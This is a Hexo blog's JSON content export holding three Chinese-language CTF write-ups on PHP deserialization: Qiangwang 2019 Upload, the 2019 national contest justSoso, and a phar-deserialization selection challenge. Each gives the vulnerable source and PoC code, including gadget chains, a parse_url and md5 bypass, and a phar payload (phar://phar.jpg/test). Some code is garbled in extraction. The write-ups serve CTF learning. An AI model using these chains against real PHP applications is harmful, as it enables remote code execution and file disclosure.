{"meta":{"title":"42's Blog","subtitle":"Do not go gentle into that good night. Old age should burn and rave at close of the day.","description":"aaaa","author":42,"url":"http://yoursite.com","root":"/"},"pages":[{"title":"分类","date":"2019-06-06T09:34:22.283Z","updated":"2019-06-06T09:34:22.283Z","comments":false,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"关于我","date":"2019-06-06T09:32:06.898Z","updated":"2019-06-06T09:32:06.898Z","comments":false,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-06-06T09:34:18.948Z","updated":"2019-06-06T09:34:18.948Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2019-06-05T12:25:46.621Z","updated":"2019-06-05T12:25:46.621Z","comments":true,"path":"about/index-1.html","permalink":"http://yoursite.com/about/index-1.html","excerpt":"","text":"about"},{"title":"","date":"2019-06-06T06:37:54.103Z","updated":"2019-06-06T06:37:54.103Z","comments":true,"path":"categories/index-1.html","permalink":"http://yoursite.com/categories/index-1.html","excerpt":"","text":"分类"}],"posts":[{"title":"2019强网杯CTF","slug":"2019qiangwang","date":"2019-06-06T09:45:26.790Z","updated":"2019-06-07T02:11:31.634Z","comments":true,"path":"2019/06/06/2019qiangwang/","link":"","permalink":"http://yoursite.com/2019/06/06/2019qiangwang/","excerpt":"WEB-1 Upload（简化）","text":"WEB-1 Upload（简化） index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpinclude 're.php';class register &#123; public $ff; public function index() &#123; print('hahaha'); &#125; public function __construct() &#123; print('hacked by jiahaoqiu'); &#125; public function guapi() &#123; if(!$this-&gt;ff) &#123; $this-&gt;ff-&gt;index(); &#125; &#125; public function __destruct() &#123; #echo 123; print('hacked by jiahaoqiu 12345'); if($this-&gt;ff) &#123; echo 'ssss'; $this-&gt;ff-&gt;index(); &#125; &#125; &#125;$fan = $_GET['a'];unserialize(base64_decode($fan));?&gt; re.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php class aa&#123; public $filename_tmp; public $filename; public $ext; #public $img; public $arr; public function __construct() &#123; echo \"hackded by jiahaoqiu\"; &#125; public function upload()&#123; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; echo 3; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); #$this-&gt;img=\"$this-&gt;filename\"; #echo $thi-&gt;img; &#125;else&#123; echo \"error\"; &#125; &#125;else&#123; echo \"error\"; &#125; &#125; public function __get($name)&#123; echo '2'; return $this-&gt;arr[$name]; &#125; public function __call($name, $arguments)&#123; echo '1'; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; public function hello() &#123; echo \"hacked by 1\"; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125; ?&gt; 本题目的是将文件夹中的2.png文件改为2.php，审计源码index.php第17行发现upload函数中第二个分支语句可利用，只要控制filename与filename_tmp属性即可达到将2.png替换为2.php的目的，而要利用upload函数就需要进观察。 做题时还是会最先考虑利用题目中很显眼的__Call与__Get两个魔术方法，发现__Call函数中：其中$arguments便是函数形参，可以利用此行语句来执行upload()。想要利用__Call函数就需要调用该类中不存在的方法；并且，再调用__Call函数时，形参$name即为被调用的那个不存在的方法的名称； 而__Get函数的利用需要调用该类中不存在的属性，此时再看__Call函数中的if($this-&gt;{$name})，竟然用形参$name 这个该类中不存在的方法做判断条件，那么当调用这个与不存在的方法同名的属性时，__Get函数便会执行，从而进入 return $this-&gt;arr[$name] 语句，所以当我们控制arr数组中下标为$name的值时便可控制return的返回值，即将$this-&gt;{$name}变为我们指定的 arr[$name]的值，结合前面要利用upload函数，将arr[$name]的值变为upload，即可将$this-&gt;{$this-&gt;{$name}}($arguments)变为执行$this-&gt;upload(); 如上，开始构造完整的序列化攻击链，首先要调用upload函数就需要调用Call函数，发现可以利用$this-&gt;ff-&gt;index()，将register类中的ff属性赋为aa类，这样就能是aa类调用其不存在的方法“index（）”，从而调用Call函数，在执行Call函数时，其中的if($this-&gt;{$name})即变为if($this-&gt;index)，而aa类中又不存在index这个属性，所以会进而调用Get函数，我们再令Get函数中的arr[index]的值为upload，使 Get函数最终将“upload“ return给$this-&gt;{$name}，便可通过$this-&gt;{$this-&gt;{$name}}($arguments)执行$this-&gt;upload()； POC: 12345678910111213&lt;?php $a = new aa(); $reg = new register();$reg -&gt; ff = $a; $a -&gt; arr = array(''index =&gt; 'upload');$a -&gt; filename_tmp = '2.png';$a -&gt; filename = '2.php';$a -&gt; ext = '1'; ?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/categories/CTF/"},{"name":"PHP反序列化","slug":"CTF/PHP反序列化","permalink":"http://yoursite.com/categories/CTF/PHP反序列化/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]},{"title":"2019国赛CTF","slug":"2019guosai","date":"2019-06-06T09:12:23.164Z","updated":"2019-06-07T02:08:51.371Z","comments":true,"path":"2019/06/06/2019guosai/","link":"","permalink":"http://yoursite.com/2019/06/06/2019guosai/","excerpt":"WEB-1 justSoso","text":"WEB-1 justSoso 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$file = $_GET[\"file\"];$payload = $_GET[\"payload\"]; if (!isset($file)) &#123; echo 'Missing parameter' . '&lt;br&gt;';&#125; if (preg_match(\"/flag/\", $file)) &#123; die('hack attacked!!!');&#125; @include ($file);if (isset($payload)) &#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'], $query); foreach ($query as $value) &#123; if (preg_match(\"/flag/\", $value)) &#123; die('stop hacking!'); exit(); &#125; &#125; $payload = unserialize($payload);&#125; else &#123; echo \"Missing parameters\";&#125;?&gt; index.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Handle &#123; private $handle; public function __wakeup() &#123; foreach (get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking upn\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct() &#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125; class Flag &#123; public $file; public $token; public $token_flag; function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1, 10000)); &#125; public function getFlag() &#123; $this-&gt;token_flag = md5(rand(1, 10000)); if ($this-&gt;token === $this-&gt;token_flag) &#123; if (isset($this-&gt;file)) &#123; echo @highlight_file($this-&gt;file, true); &#125; &#125; &#125;a?&gt; hint.php 这道题的重点不是其中的反序列化，而是其中parse_url与md5的绕过方法 分析hint源码发现，我们需要将Handle类中的handle属性赋值为Flag类以调用getFlag()函数，但单单这样构造序列化之后，传入的payload中肯定含有“flag”这一字符串，会因index.php源码中的遍历url而被匹配到，经过搜索发现，可以通过加两个双斜杠的方式绕过parse_url进而绕过正则匹配。 parse_url绕过 但getFlag()函数中还存在一个问题，虽然Flag类中前几条语句将token属性与token_flag属性相等，getFlag函数中，又将token_flag赋为了一个新的md5加密后的随机值，所以此处又需要绕过，爆破似乎可行，但经过搜索发现存在另一种较为简单的方法：利用取地址符号“&amp;”，来使token与token_flag的关系始终相等，这样在给token_flag赋新值时，token也会跟着变化。 POC: 1234$b = new Flag(&quot;flag.php&quot;);$b-&gt;token = &amp;$b-&gt;token_flag;$a = new Handle($b);echo serialize($a);","categories":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/categories/CTF/"},{"name":"PHP反序列化","slug":"CTF/PHP反序列化","permalink":"http://yoursite.com/categories/CTF/PHP反序列化/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"},{"name":"md5绕过","slug":"md5绕过","permalink":"http://yoursite.com/tags/md5绕过/"},{"name":"parse_url绕过","slug":"parse-url绕过","permalink":"http://yoursite.com/tags/parse-url绕过/"}]},{"title":"团队省赛选拔题","slug":"tags_test","date":"2019-06-06T06:31:27.841Z","updated":"2019-06-07T02:13:38.902Z","comments":true,"path":"2019/06/06/tags_test/","link":"","permalink":"http://yoursite.com/2019/06/06/tags_test/","excerpt":"phar反序列化","text":"phar反序列化 引入 https://paper.seebug.org/680/ 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?php include('flag.php');class hello&#123; public $name; public $welcome; public function __construct($name) &#123; $this-&gt;name = $name; &#125; public function simple_hello() &#123; $this-&gt;welcome = \"hello \".$this-&gt;name.\" welcome to ctf!\".\"&lt;br/&gt;\"; echo $this-&gt;welcome; &#125; public function __destruct() &#123; $this-&gt;simple_hello(); echo 'test'; &#125;&#125;class gogogo&#123; public $one; public $two; public function __toString() &#123; $this-&gt;one-&gt;get_flag(); return '0'; &#125;&#125;class nice&#123; public $file; public $flag; public function __construct($flag, $file) &#123; $this-&gt;flag = $flag; $this-&gt;file = $file; &#125; public function check() &#123; chdir('upload'); if(file_exists($this-&gt;file.\".jpg\")) &#123; echo 'file exist'.\"&lt;br/&gt;\"; &#125; else &#123; echo 'file not exist'.\"&lt;br/&gt;\"; &#125; &#125; public function get_flag() &#123; echo $this-&gt;flag.\"&lt;br/&gt;\"; &#125;&#125;@$a = $_GET['filename'];$e = new nice($flag, $a);$e-&gt;check(); ?&gt; 刚刚拿到这道题的时候，发现存在多个PHP魔术方法，明显是反序列化；但进一步审计发现并没有任何userialize的地方，经过搜索发现存在一种名为phar反序列化漏洞，即在不利用unserialize()函数的情况下，利用文件操作函数（file_exits、is_dir等）实现反序列化。 首先分析一波phar文件的结构：phar本质上是一种压缩文件，其中`meta-data`部分需要被序列化之后存储，利用该漏洞的核心便是当文件操作函数结合`phar://伪协议`时会将phar文件中的`meta-data`部分反序列化，这时我们构造的序列化攻击链就会发挥作用 其次，phar文件结构中还要添加被压缩的文件名（ex：test.jpg），之前由于一直未注意到这个问题导致题目卡了很长时间。。。。 经过以上分析，我们可以写一个php文件（该文件中已将序列化构造链传到meta-data，本体攻击链构造较为简单，就不详述），访问该php文件会在目录下生成一个phar文件： POC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php class hello&#123; public $name; public $welcome; public function simple_hello() &#123; $this-&gt;welcome = \"hello \".$this-&gt;name.\" welcome to ctf!\".\"&lt;br/&gt;\"; echo $this-&gt;welcome; &#125; public function __destruct() &#123; $this-&gt;simple_hello(); echo 'test'; &#125;&#125; class gogogo&#123; public $one; public $two; public function __toString() &#123; $this-&gt;one-&gt;get_flag(); return '0'; &#125;&#125; class nice&#123; public $file; public $flag; public function get_flag() &#123; echo $this-&gt;flag.\"&lt;br/&gt;\"; &#125;&#125; $he = new hello();$he -&gt;name = new gogogo();$he -&gt;name -&gt; one = new nice(); $phar = new Phar('phar.phar');$phar -&gt; stopBuffering();$phar -&gt; setStub('&lt;?php __HALT_COMPILER();?&gt;');$phar -&gt; addFromString('test.txt','test');$phar -&gt; setMetadata($he);$phar -&gt; stopBuffering(); ?&gt; 生成`phar.phar`文件之后，将其后缀名改为.jpg直接上传，上传后在存在各种类源码的ctf.php页面传入fiename参数。（ex：`ctf.php?filename=phar://upload/phar.jpg`） 本来以为这道题就这样了，flag就会出来了，但怎么尝试上传flag就是不会回显，心态也有点崩。。。 后经大佬提示，源码中47行check()函数： 123456789101112public function check() &#123; chdir('upload'); if(file_exists($this-&gt;file.\".jpg\")) &#123; echo 'file exist'.\"&lt;br/&gt;\"; &#125; else &#123; echo 'file not exist'.\"&lt;br/&gt;\"; &#125; &#125; 发现首先会将目录切换到upload并且会在file属性后拼接一个“.jpg“，这样的话，就需要将原来添加的压缩文件名“test.txt”改为“test.jpg”以配合拼接最终PAYLOAD：ctf.php?filename=phar://phar.jpg/test","categories":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/categories/CTF/"},{"name":"PHP反序列化","slug":"CTF/PHP反序列化","permalink":"http://yoursite.com/categories/CTF/PHP反序列化/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]}]}